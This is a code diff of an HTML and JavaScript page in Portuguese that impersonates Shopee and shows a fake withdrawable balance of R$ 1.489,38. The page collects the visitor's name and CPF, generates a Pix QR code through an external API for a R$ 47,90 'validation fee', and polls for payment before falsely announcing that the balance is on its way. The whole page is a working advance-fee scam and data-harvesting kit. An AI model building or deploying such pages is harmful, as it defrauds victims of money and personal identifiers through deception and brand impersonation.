@@ -3,88 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Resgate de Saldo</title>
+    <title>Resgate Shopee</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Roboto', sans-serif; background-color: #f5f5f5; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        /* --- ESTILO GERAL E ROBUSTO --- */
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            margin: 0; padding: 0;
+            overflow-x: hidden; /* Evita rolagem lateral */
+        }
+
+        /* --- TELA 1: SELEÇÃO DE VALOR --- */
+        #screen-1 { padding: 15px; display: flex; flex-direction: column; align-items: center; transition: filter 0.3s; }
         
+        /* Card Laranja do Topo */
         .top-card {
             background: linear-gradient(135deg, #ee4d2d, #ff7337);
             width: 100%; max-width: 480px; border-radius: 8px; padding: 20px; color: white;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 15px; position: relative;
+            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.2); margin-bottom: 15px; position: relative;
         }
         .top-card h3 { margin: 0; font-size: 14px; font-weight: 500; opacity: 0.9; }
         .top-card h1 { margin: 5px 0 15px 0; font-size: 32px; font-weight: 700; }
         .coin-icon { position: absolute; top: 20px; right: 20px; background: #f0c419; color: #ee4d2d; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
 
+        /* Card Branco */
         .withdraw-card { background: white; width: 100%; max-width: 480px; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); margin-bottom: 15px; }
         .withdraw-title { font-size: 16px; font-weight: 700; color: #222; margin-bottom: 15px; }
-        
-        .pix-row { display: flex; align-items: center; gap: 6px; margin-bottom: 15px; font-size: 13px; color: #555; font-weight: 500; }
-        .pix-icon { height: 16px; width: auto; }
-        
+
+        /* Opções de Valor */
         .options-row { display: flex; gap: 10px; margin-bottom: 10px; }
         .money-option { background: #f5f5f5; border: 1px solid #e0e0e0; border-radius: 6px; padding: 12px 0; text-align: center; font-weight: 600; color: #333; cursor: pointer; transition: all 0.2s; flex: 1; }
         .money-option.big { width: 100%; font-size: 24px; padding: 20px 0; margin-bottom: 20px; }
+        
+        /* Selecionado */
         .money-option.selected { border: 2px solid #ee4d2d; color: #ee4d2d; background-color: #fff5f5; }
 
-        .btn-sacar { width: 100%; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; color: white; background-color: #ccc; cursor: not-allowed; transition: 0.3s; }
-        .btn-sacar.active { background-color: #ee4d2d; cursor: pointer; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
+        /* Botão Principal */
+        .btn-main { width: 100%; padding: 16px; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; color: white; background-color: #ccc; cursor: not-allowed; transition: 0.3s; text-transform: uppercase; }
+        .btn-main.active { background-color: #ee4d2d; cursor: pointer; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
 
-        .info-text { font-size: 12px; color: #888; text-align: center; margin-top: 15px; line-height: 1.4; }
-        .shopee-logo { width: 60px; opacity: 0.8; }
+        /* --- TELA 2: GAVETA (BOTTOM SHEET) --- */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 90;
+            opacity: 0; visibility: hidden; transition: 0.3s;
+        }
+        .overlay.visible { opacity: 1; visibility: visible; }
+
+        .bottom-drawer {
+            position: fixed; bottom: -100%; left: 0; width: 100%;
+            background: white; border-radius: 20px 20px 0 0;
+            padding: 25px 20px; z-index: 100;
+            transition: bottom 0.4s cubic-bezier(0.16, 1, 0.3, 1); /* Animação suave e natural */
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.1);
+        }
+        .bottom-drawer.open { bottom: 0; }
+
+        .drawer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .drawer-title { font-size: 18px; font-weight: 700; color: #333; }
+        .close-btn { font-size: 24px; color: #999; cursor: pointer; padding: 5px; }
+
+        .input-group { margin-bottom: 15px; }
+        .input-label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; font-weight: 500; }
+        .input-field { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; transition: 0.3s; }
+        .input-field:focus { border-color: #ee4d2d; }
+
+        /* --- TELA 3: PAGAMENTO (FULL SCREEN) --- */
+        #screen-3 {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 200;
+            display: none; flex-direction: column; align-items: center; padding: 20px;
+            overflow-y: auto;
+        }
+        
+        .pix-header { width: 100%; text-align: center; padding-bottom: 20px; border-bottom: 1px solid #eee; margin-bottom: 20px; }
+        .shopee-logo-small { width: 100px; }
+        
+        .qr-container { text-align: center; margin: 20px 0; }
+        .qr-img { width: 220px; border: 1px solid #eee; border-radius: 8px; }
+        
+        .code-box { 
+            background: #f9f9f9; border: 1px dashed #ccc; padding: 15px; 
+            width: 100%; font-size: 12px; color: #555; text-align: center; 
+            border-radius: 6px; word-break: break-all; margin-bottom: 20px;
+        }
+
+        .success-badge {
+            background: #e8f5e9; color: #2e7d32; padding: 10px; 
+            border-radius: 6px; font-size: 14px; font-weight: 600; 
+            display: flex; align-items: center; gap: 8px; margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
-    <div class="top-card">
-        <div class="coin-icon">$</div>
-        <h3>Seu saldo</h3>
-        <h1>R$ 1.489,38</h1>
-        <div style="font-size: 12px; opacity: 0.8;">= 42.583,05 pontos (s)</div>
-        <div style="border-top: 1px dashed rgba(255,255,255,0.3); margin-top: 15px; padding-top: 10px; font-size: 11px;">Última bonificação apresentada : R$ 845,24</div>
-    </div>
 
-    <div class="withdraw-card">
-        <div class="withdraw-title">Sacar dinheiro</div>
-        <div class="pix-row">
-            <span>Transferência via /</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg" class="pix-icon" alt="Pix">
+    <div id="screen-1">
+        <div class="top-card">
+            <div class="coin-icon">$</div>
+            <h3>Saldo Disponível</h3>
+            <h1>R$ 1.489,38</h1>
+            <div style="font-size: 12px; opacity: 0.9;">Disponível para saque imediato</div>
         </div>
 
-        <div class="options-row">
-            <div class="money-option" onclick="selectValue(this)">R$1,5</div>
-            <div class="money-option" onclick="selectValue(this)">R$5</div>
-            <div class="money-option" onclick="selectValue(this)">R$10</div>
+        <div class="withdraw-card">
+            <div class="withdraw-title">Selecione o valor do saque</div>
+            
+            <div class="options-row">
+                <div class="money-option" onclick="selectValue(this, 1.50)">R$1,5</div>
+                <div class="money-option" onclick="selectValue(this, 5.00)">R$5</div>
+                <div class="money-option" onclick="selectValue(this, 10.00)">R$10</div>
+            </div>
+
+            <div class="money-option big" onclick="selectValue(this, 1489.38)">
+                R$ 1.489,38
+            </div>
+
+            <p style="font-size:12px; color:#888; text-align:center; margin-bottom:15px;">
+                Taxa de transação segura: <strong>R$ 47,90</strong> (Reembolsável)
+            </p>
+
+            <button id="btn-step1" class="btn-main" onclick="openDrawer()">
+                SACAR DINHEIRO
+            </button>
         </div>
-
-        <div class="money-option big" onclick="selectValue(this)">R$ 1.489,38</div>
-
-        <button id="btn-sacar" class="btn-sacar" onclick="irParaCheckout()">Sacar dinheiro</button>
-
-        <p class="info-text">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.</p>
+        
+        <div style="margin-top:20px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" width="80" style="opacity:0.5">
+        </div>
     </div>
 
-    <div class="withdraw-card">
-        <div class="withdraw-title">Obtenha seu acesso exclusivo</div>
-        <p style="font-size:12px; color:#666; line-height:1.5;">Descubra todos os benefícios liberados especialmente para você.</p>
-        <div style="text-align:right; margin-top:10px;"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo"></div>
+    <div class="overlay" id="overlay" onclick="closeDrawer()"></div>
+    <div class="bottom-drawer" id="drawer">
+        <div class="drawer-header">
+            <span class="drawer-title">Dados para Recebimento</span>
+            <span class="close-btn" onclick="closeDrawer()">&times;</span>
+        </div>
+        
+        <p style="font-size:13px; color:#666; margin-bottom:20px;">
+            Informe seus dados para validarmos a transferência Pix. O valor será enviado para a chave CPF cadastrada.
+        </p>
+
+        <div class="input-group">
+            <label class="input-label">NOME COMPLETO</label>
+            <input type="text" id="nome" class="input-field" placeholder="Ex: João Silva">
+        </div>
+
+        <div class="input-group">
+            <label class="input-label">CPF (CHAVE PIX)</label>
+            <input type="tel" id="cpf" class="input-field" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
+        </div>
+
+        <button id="btn-confirmar" class="btn-main active" onclick="gerarPix()">
+            CONFIRMAR E SACAR
+        </button>
+    </div>
+
+    <div id="screen-3">
+        <div class="pix-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo-small">
+        </div>
+
+        <h2 style="font-size:22px; color:#333; margin:10px 0;">Finalize seu Saque</h2>
+        <p style="color:#666; font-size:14px; text-align:center;">
+            Pague a taxa de validação de <strong>R$ 47,90</strong> para liberar o saldo total de R$ 1.489,38 imediatamente.
+        </p>
+
+        <div class="success-badge">
+            ✅ Dados validados: <span id="user-name-display">...</span>
+        </div>
+
+        <div class="qr-container">
+            <img id="qr-image" class="qr-img" src="">
+        </div>
+
+        <div style="width:100%; max-width:400px;">
+            <p style="font-size:12px; font-weight:bold; color:#333; margin-bottom:5px;">Pix Copia e Cola:</p>
+            <textarea id="pix-copia" class="code-box" readonly></textarea>
+            
+            <button class="btn-main active" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+            
+            <div id="msg-sucesso" style="margin-top:20px; text-align:center; display:none;">
+                <h3 style="color:#28a745; margin-bottom:5px;">PAGAMENTO CONFIRMADO!</h3>
+                <p style="font-size:13px;">Seu saldo está sendo enviado...</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        function selectValue(element) {
-            document.querySelectorAll('.money-option').forEach(btn => btn.classList.remove('selected'));
-            element.classList.add('selected');
-            const btn = document.getElementById('btn-sacar');
-            btn.classList.add('active');
-            btn.innerText = "SACAR AGORA";
+        // --- LÓGICA DO SISTEMA ---
+        const API_URL = "https://checkout-pix-profissional.onrender.com";
+        let valorSelecionado = 0;
+
+        // 1. MÁSCARA DE CPF
+        function mask(i){ 
+            let v=i.value.replace(/\D/g,""); 
+            v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); 
+            i.value=v; 
         }
-        function irParaCheckout() {
-            const btn = document.getElementById('btn-sacar');
-            if (btn.classList.contains('active')) {
-                window.location.href = "/iof.html"; // Redireciona para o checkout da taxa
-            } else {
-                alert("Selecione um valor.");
+
+        // 2. SELEÇÃO DE VALOR
+        function selectValue(el, val) {
+            document.querySelectorAll('.money-option').forEach(b => b.classList.remove('selected'));
+            el.classList.add('selected');
+            valorSelecionado = val;
+            
+            const btn = document.getElementById('btn-step1');
+            btn.classList.add('active');
+            btn.disabled = false;
+        }
+
+        // 3. ABRIR GAVETA (TELA 2)
+        function openDrawer() {
+            if (valorSelecionado === 0) return alert("Selecione um valor primeiro.");
+            document.getElementById('overlay').classList.add('visible');
+            document.getElementById('drawer').classList.add('open');
+        }
+
+        function closeDrawer() {
+            document.getElementById('overlay').classList.remove('visible');
+            document.getElementById('drawer').classList.remove('open');
+        }
+
+        // 4. GERAR PIX E IR PARA TELA 3
+        async function gerarPix() {
+            const nome = document.getElementById('nome').value;
+            const cpf = document.getElementById('cpf').value;
+            const btn = document.getElementById('btn-confirmar');
+
+            if (nome.length < 3 || cpf.length < 14) return alert("Preencha Nome e CPF corretamente.");
+
+            btn.innerText = "PROCESSANDO...";
+            btn.disabled = true;
+
+            try {
+                // Chama a API
+                const response = await fetch(`${API_URL}/pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ amount: 47.90, name: nome, cpf: cpf.replace(/\D/g,'') })
+                });
+
+                const data = await response.json();
+
+                if (data.point_of_interaction) {
+                    // Prepara a Tela 3
+                    document.getElementById('user-name-display').innerText = nome;
+                    document.getElementById('qr-image').src = `data:image/png;base64,${data.point_of_interaction.transaction_data.qr_code_base64}`;
+                    document.getElementById('pix-copia').value = data.point_of_interaction.transaction_data.qr_code;
+
+                    // Troca de Tela (Fecha gaveta e mostra tela cheia)
+                    closeDrawer();
+                    document.getElementById('screen-1').style.display = 'none'; // Esconde tela 1
+                    document.getElementById('screen-3').style.display = 'flex'; // Mostra tela 3
+
+                    // Inicia Monitoramento
+                    monitor(data.id);
+                } else {
+                    alert("Erro ao criar Pix. Tente novamente.");
+                    btn.innerText = "CONFIRMAR E SACAR";
+                    btn.disabled = false;
+                }
+
+            } catch (error) {
+                alert("Erro de conexão.");
+                btn.innerText = "CONFIRMAR E SACAR";
+                btn.disabled = false;
             }
+        }
+
+        // 5. COPIAR CÓDIGO
+        function copiarCodigo() {
+            const textarea = document.getElementById('pix-copia');
+            textarea.select();
+            document.execCommand('copy');
+            alert("Código Pix copiado com sucesso!");
+        }
+
+        // 6. MONITORAR PAGAMENTO
+        function monitor(id) {
+            setInterval(async () => {
+                try {
+                    const r = await fetch(`${API_URL}/pix/${id}`);
+                    const j = await r.json();
+                    if (j.status === 'approved') {
+                        document.getElementById('msg-sucesso').style.display = 'block';
+                        document.getElementById('qr-image').style.opacity = 0.5;
+                    }
+                } catch (e) {}
+            }, 3000);
         }
     </script>
 </body>
